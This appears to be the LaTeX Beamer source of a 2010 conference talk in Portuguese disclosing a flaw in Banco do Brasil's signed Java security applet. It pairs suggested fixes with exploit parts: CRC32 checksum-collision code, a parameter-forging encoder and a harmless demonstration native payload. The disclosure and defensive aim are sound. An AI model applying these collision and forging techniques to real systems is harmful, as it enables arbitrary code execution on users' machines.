@@ -1,0 +1,417 @@
+%% LyX 1.6.7 created this file.  For more info, see http://www.lyx.org/.
+%% Do not edit unless you really know what you are doing.
+\documentclass[brazil]{beamer}
+\usepackage{mathptmx}
+\usepackage[T1]{fontenc}
+\usepackage[latin9]{inputenc}
+\usepackage{url}
+\usepackage{amsmath}
+\usepackage{graphicx}
+\usepackage{amssymb}
+
+\makeatletter
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Textclass specific LaTeX commands.
+ % this default might be overridden by plain title style
+ \newcommand\makebeamertitle{\frame{\maketitle}}%
+ \AtBeginDocument{
+   \let\origtableofcontents=\tableofcontents
+   \def\tableofcontents{\@ifnextchar[{\origtableofcontents}{\gobbletableofcontents}}
+   \def\gobbletableofcontents#1{\origtableofcontents}
+ }
+ \makeatletter
+ \long\def\lyxframe#1{\@lyxframe#1\@lyxframestop}%
+ \def\@lyxframe{\@ifnextchar<{\@@lyxframe}{\@@lyxframe<*>}}%
+ \def\@@lyxframe<#1>{\@ifnextchar[{\@@@lyxframe<#1>}{\@@@lyxframe<#1>[]}}
+ \def\@@@lyxframe<#1>[{\@ifnextchar<{\@@@@@lyxframe<#1>[}{\@@@@lyxframe<#1>[<*>][}}
+ \def\@@@@@lyxframe<#1>[#2]{\@ifnextchar[{\@@@@lyxframe<#1>[#2]}{\@@@@lyxframe<#1>[#2][]}}
+ \long\def\@@@@lyxframe<#1>[#2][#3]#4\@lyxframestop#5\lyxframeend{%
+   \frame<#1>[#2][#3]{\frametitle{#4}#5}}
+ \makeatother
+ \def\lyxframeend{} % In case there is a superfluous frame end
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% User specified LaTeX commands.
+\usetheme{Warsaw}
+% or ...
+
+\setbeamercovered{transparent}
+% or whatever (possibly just delete it)
+\usepackage{minted}
+
+\makeatother
+
+\usepackage{babel}
+
+\begin{document}
+
+\title{Explorando applets Java assinadas}
+
+
+\subtitle{Um estudo de caso com o módulo de segurança\\
+do Banco do Brasil}
+
+
+\author{Paulo Matias\inst{1}}
+
+
+\institute{\inst{1}Instituto de Física de São Carlos\\
+Universidade de São Paulo}
+
+
+\date{H2HC - 2010}
+
+\makebeamertitle
+
+\lyxframeend{}\lyxframe{No primeiro acesso}
+
+\begin{center}
+O usuário se depara com a applet legítima:
+\par\end{center}
+
+\begin{center}
+\includegraphics[width=1\columnwidth,height=0.6\paperheight,keepaspectratio]{fig01-assinatura}
+\par\end{center}
+
+\begin{center}
+E aceita, afinal, ele confia em quem a publicou.
+\par\end{center}
+
+
+\lyxframeend{}\lyxframe{Em acessos posteriores}
+
+\begin{center}
+Para comodidade do usuário, a applet Java passa a ser carregada automaticamente.
+\par\end{center}
+
+\begin{center}
+\includegraphics[width=1\columnwidth]{fig02-verificando}
+\par\end{center}
+
+\begin{center}
+A applet e sua origem são consideradas, de fato, confiáveis.
+\par\end{center}
+
+
+\lyxframeend{}\lyxframe{Surge a falha}
+\begin{itemize}
+\item A assinatura garante que a applet foi empacotada pela chave legítima.
+\item Mas e se a fosse possível carregar código externo por meio da applet?
+
+\begin{itemize}
+\item O código externo não é protegido pelos mecanismos do Java.
+\item Seria possível executar código na máquina do alvo.
+\end{itemize}
+\end{itemize}
+
+\lyxframeend{}\lyxframe{Como saber?}
+\begin{itemize}
+\item ``Engenharia Reversa em Aplicativos Java'' - The Bug! Magazine, Edição
+4.
+
+\begin{itemize}
+\item Nem todos esperam encontrar esse tipo de falha em códigos criados
+em linguagens de alto nível!
+\end{itemize}
+\item Falha encontrada enquanto se desenvolvia uma alternativa em JavaScript
+para acessar o BB sem o Java.
+\end{itemize}
+
+\lyxframeend{}\lyxframe{operagbas (vídeo 1)}
+
+
+\lyxframeend{}\lyxframe{operagbas (vídeo 2)}
+
+
+\lyxframeend{}\lyxframe{Voltemos à falha}
+\begin{itemize}
+\item A falha, nesta applet, dependia de três pontos distintos para ser
+explorada:
+
+\begin{itemize}
+\item Ausência de validação de contexto.
+\item Dependência de parâmetros externos.
+\item Validação fraca da biblioteca de código nativo.
+\end{itemize}
+\end{itemize}
+
+\lyxframeend{}\lyxframe{Ausência de validação de contexto}
+\begin{itemize}
+\item O mecanismo de autorização do Java não verifica onde a applet é usada.
+\item Verificá-lo pode ser uma medida proativa interessante.
+\end{itemize}
+
+\lyxframeend{}
+
+\definecolor{bg}{rgb}{0.95,0.95,0.95} 
+
+\begin{frame}[fragile]{Validar o contexto (sugestão)}
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\tiny]{java}
+public class GbAs extends JApplet implements Observer {
+  public void init() {
+    /* ... */
+    String expectedCodeBase = "https://www2.bancobrasil.com.br/aapf/idh";
+    String expectedDocBase  = "https://www2.bancobrasil.com.br/aapf";
+    if(getCodeBase().toString().startsWith(expectedCodeBase) &&
+       getDocumentBase().toString().startsWith(expectedDocBase)) {
+      /* ... */
+    }
+    else {
+      this.f.set(5);
+    }
+    super.init();
+  }
+  /* ... */
+}
+\end{minted}
+\end{frame}
+
+\begin{frame}[fragile]{Dependência de parâmetros externos}
+A applet recebia os seguintes parâmetros a partir do HTML:
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\tiny]{html}
+<applet id="jmid" name="jmid" archive="/aapf/idh/GbAs.jar" code="br/com/gas/mid/GbAs.class"
+ height="1" width="1" MAYSCRIPT>
+    <param value="eNoNy8lygjAAANDf6QwHWQKUQw+AIEogLBGIlw4Eym5MZan9+vbdnyAHb59y64EC5T/heNXugZr
+pazaPtSPmFTgxXTCI1UIX9vrvxUR5OkWzM1B3HxzsmHuTnrnmU7cZ+psT8m5dPcL47XAUz9ojCmpRHU5LQOFSw8zvumIx
+UjRrF2etFXTAeGDxg2i6TVXabfx/1Ca+Jt6XFOZltIHWvu4GLu/IWkWpnftMShE0p+cLbLyKbH6/fNsV6jh4GXbImp7Wy
+jFyCWJCc1QaAYxtQtic4C2FJYnxWDB1Iq7ynhehW7IJxUyMwdOfBlO2zJhKC9zPH38QqFtN" name="seed" />
+    <param name="statusChangeCallback" value="checkApplet"/>
+</applet> 
+\end{minted}
+Após decodificados:
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\small]{javascript}
+{ GBAS17: 'BB'
+, GBAS16: 'https://www2.bancobrasil.com.br/aapf/idh/'
+, GBAS10: '2009-Sep-08 12:05:23'
+, GBAS11: 'bd1242d85c5abdc6d833f8f0c82a4697'
+, GBAS18: 'https://www14.bancobrasil.com.br/update/rld/'
+, GTSTR_GBAS23: '61'
+}
+\end{minted}
+\end{frame}
+
+\begin{frame}[fragile]{Dependência de parâmetros externos}
+O parâmetro \texttt{GBAS16} era utilizado no seguinte código:
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\tiny]{java}
+public class LibraryManager {
+  public String downloadLibrary(String options) {
+    String url;
+    if(!(url = OptionManager.splitString(options, "GBAS16=")).endsWith("/")) {
+      url = url + '/';
+    }
+    url = url + getLibraryName();
+    String path = getLibraryPath();
+    if(!validateLocalLibraryChecksum()) {
+      (new Download()).download(url, path);
+    }
+    return path;
+  }
+  /* ... */
+}
+\end{minted}
+\end{frame}
+
+\begin{frame}[fragile]{Utilizar uma url definida na compilação (sugestão)}
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\small]{java}
+public class LibraryManager {
+  public String downloadLibrary(String options) {
+    String url =
+        "https://www2.bancobrasil.com.br/aapf/idh/" +
+        getLibraryName();
+    String path = getLibraryPath();
+    if(!validateLocalLibraryChecksum()) {
+      (new Download()).download(url, path);
+    }
+    return path;
+  }
+  /* ... */
+}
+\end{minted}
+\end{frame}
+
+\begin{frame}[fragile]{Validação fraca da biblioteca de código nativo}
+\begin{itemize}
+\item Era utilizado um checksum baseado no CRC32 (fácil colisão).
+\item Checksums disponíveis em \texttt{br/com/gas/mid/gbasfiles.chk}:
+\end{itemize}
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt]{ini}
+GBAS_SO_HASH=g8gAgt8QE0Dolbiyiyc=
+GBAS_DYLIB_HASH=g8gAgtsVE0hK8XUyvn7j
+GBAS_DLL_HASH=g8gAgtgVE0rn5r/xnltS 
+\end{minted}
+\end{frame}
+
+\begin{frame}[fragile]{Colidindo um checksum do tipo CRC32}
+
+Método baseado em \url{http://www.woodmann.com/fravia/crctut1.htm}:
+
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\tiny]{javascript}
+RevCk.init = function() {
+    this.rev = {};
+    for(var i = 0; i < this.tbl.length; i++) {
+        var topByte = (RevCk.tbl[i] >>> 24) & 0xff;
+        this.rev[topByte] = i;
+    }
+};
+RevCk.calc = function(current, wanted) {
+    current ^= 0xffffffff;
+    wanted  ^= 0xffffffff;
+    var buf = [0, 0, 0, 0, 0, 0, 0, 0];
+    var xor4 = function(i, value) {  // little-endian
+       buf[i+0] ^= (value >>>  0) & 0xff;
+       buf[i+1] ^= (value >>>  8) & 0xff;
+       buf[i+2] ^= (value >>> 16) & 0xff;
+       buf[i+3] ^= (value >>> 24) & 0xff;
+    };
+    xor4(0, current);
+    xor4(4,  wanted);
+    for(var i = 4; i > 0; i--) {
+        var entryNum = this.rev[buf[i+3]];
+        var entryVal = this.tbl[entryNum];
+        xor4(i, entryVal);
+        buf[i-1] ^= entryNum;
+    }
+    return buf.slice(0, 4);
+};
+\end{minted}
+\end{frame}
+
+\begin{frame}[fragile]{Utilizar um hash mais forte (sugestão)}
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\tiny]{java}
+public class LibraryManager {
+  public boolean validateLocalLibraryChecksum() {
+    String hash = ""; 
+    String correctHash = a();
+    String path = getLibraryPath();
+    File file = new File(path);
+    if(correctHash == "")
+      return 0;
+    if(!file.exists() || (file.length() == 0))
+      return 0;
+    try {
+      DigestInputStream stream = 
+        new DigestInputStream(
+          new FileInputStream(file),
+          MessageDigest.getInstance("SHA-256")
+        );
+      while(stream.read() != -1);
+      StringBuilder sBuilder = new StringBuilder();
+      for(byte b : stream.getMessageDigest().digest()) {
+        sBuilder.append(Character.forDigit((b>>4) & 0xf, 16));
+        sBuilder.append(Character.forDigit((b   ) & 0xf, 16));
+      }
+      hash = sBuilder.toString();
+    }
+    catch(IOException e) {
+      return 0;
+    }
+    catch(NoSuchAlgorithmException e) {
+      return 0;
+    }
+    return (hash == correctHash);
+  }
+  /* ... */
+\end{minted}
+\end{frame}
+
+
+\lyxframeend{}\lyxframe{Funcionamento do exploit}
+
+Para explorar a falha, é necessário:
+\begin{itemize}
+\item Criar bibliotecas nativas (\texttt{.so}, \texttt{.dll}, \texttt{.dylib})
+com código malicioso.
+\item Gerar um arquivo que colida com o checksum verificado pela applet.
+\item Gerar uma string de parâmetros forjada.
+\end{itemize}
+
+\lyxframeend{}
+
+\begin{frame}[fragile]{Código da biblioteca nativa}
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\tiny]{c}
+static void do_exploit() {
+    const char *msg = "Parabens! Voce acabou de ser afetado"
+                      "por um exploit de demonstracao do H2HC 2010.";
+    const char *basename = "VOCE_FOI_EXPLOITADO.txt";
+    const char *homedir = getenv("HOME");
+    char filename[256];
+    FILE *fp;
+    if(homedir)
+        snprintf(filename, sizeof(filename), "%s/%s", homedir, basename);
+    else
+        strncpy(filename, basename, sizeof(filename));
+    if((fp = fopen(filename, "w"))) {
+        fwrite(msg, strlen(msg), 1, fp);
+        fclose(fp);
+    }
+    if(!fork()) {
+        execlp("gedit", "gedit", filename, NULL);
+    }
+    if(!fork()) {
+        execlp("xterm", "xterm", "-e", "less", filename, NULL);
+    }
+}
+/* ... */
+JNIEXPORT jstring JNICALL
+Java_br_com_gas_mid_entity_CLibrary_getVersion(JNIEnv *env, jobject obj) {
+    return exploit_and_return_jstring(env, "1.3.3.7");
+}
+\end{minted}
+\end{frame}
+
+\begin{frame}[fragile]{Colisão do checksum}
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\small]{javascript}
+    var data = Base64.arrayifyString(fs.readFileSync(
+srcfile, 'binary'));
+    var curCkSum = CkSum.getValue(data);
+    sys.puts('Calculated checksum: '+curCkSum);
+    
+    var revBytes = RevCk.calc(curCkSum, expectedCkSum);
+    sys.puts('RevCk: ' + sys.inspect(revBytes.map(hex)));
+    
+    var data = fs.readFileSync(srcfile);
+    var revBytes = new Buffer(revBytes);
+    var fd = fs.openSync(destfile, 'w');
+    fs.writeSync(fd, data, 0, data.length);
+    fs.writeSync(fd, revBytes, 0, revBytes.length);
+    fs.closeSync(fd);
+\end{minted}
+\end{frame}
+
+\begin{frame}[fragile]{Geração da string de parâmetros}
+\begin{minted}[bgcolor=bg,frame=single,framerule=0.05pt,fontsize=\small]{javascript}
+function encodeParams(params, f) {
+    var plainText = '';
+    for(var key in params) {
+        plainText += key + '=' + params[key] + '|';
+    }
+    plainText = plainText.substr(0, plainText.length-1);
+    var partialKey = 'aBcDeFgH';
+    var key =Base64.arrayifyString(partialKey+'!#$%&*)');
+    var cipherText = Encripta(plainText, key);
+    var result = partialKey + cipherText;
+    require('child_process').exec('python -c  \'import
+base64,zlib;print(base64.b64encode(zlib.compress("'+
+result+'")))\'', function(err, stdout, stderr) {
+        f(stdout);
+    });
+}
+\end{minted}
+\end{frame}
+
+
+\lyxframeend{}\lyxframe{Demonstração do exploit}
+
+
+\lyxframeend{}\lyxframe{Conclusão e agradecimentos}
+\begin{itemize}
+\item Falha relativamente simples de entender, porém de consequências amplas.
+\item Espera-se incentivar mais pesquisa neste tipo de falha.
+\item Agradecemos ao CSIRT do Banco do Brasil pela recepção atenciosa do
+relatório e pela seriedade com a qual lidaram com a questão.
+
+\begin{itemize}
+\item Agradecimentos especiais a Fernando A. Higa.
+\end{itemize}
+\end{itemize}
+
+\lyxframeend{}
+\end{document}
